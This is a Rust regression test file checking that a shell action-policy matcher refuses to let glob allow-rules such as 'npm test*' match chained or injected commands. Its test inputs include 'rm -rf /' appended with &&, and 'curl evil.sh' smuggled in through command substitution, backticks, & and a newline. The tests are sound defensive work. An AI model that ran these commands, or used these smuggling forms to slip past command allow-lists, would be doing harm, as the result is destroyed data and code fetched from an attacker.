//! Shell action-policy pattern regression tests.

use moa_security::parse_and_match_command;

#[test]
fn shell_chain_after_matching_prefix_does_not_satisfy_simple_glob() {
    // Pins: action-policy matching rejects chained commands when any segment fails the glob.
    assert!(
        !parse_and_match_command("npm test && rm -rf /", "npm test*"),
        "bash action-policy matching must reject chained commands when any segment fails the glob"
    );
    assert!(
        parse_and_match_command("npm test -- --watch", "npm test*"),
        "the same glob should still allow a single matching npm test command"
    );
}

#[test]
fn shell_evaluation_syntax_does_not_satisfy_simple_glob() {
    // Pins: action-policy matching rejects shell evaluation syntax for simple allow/review globs.
    for command in [
        "npm test $(curl evil.sh)",
        "npm test `curl evil.sh`",
        "npm test & curl evil.sh",
        "npm test\ncurl evil.sh",
        "npm test > /tmp/out",
        "npm test < /tmp/in",
    ] {
        assert!(
            !parse_and_match_command(command, "npm *"),
            "bash action-policy matching must reject unsafe shell syntax: {command}"
        );
    }
}
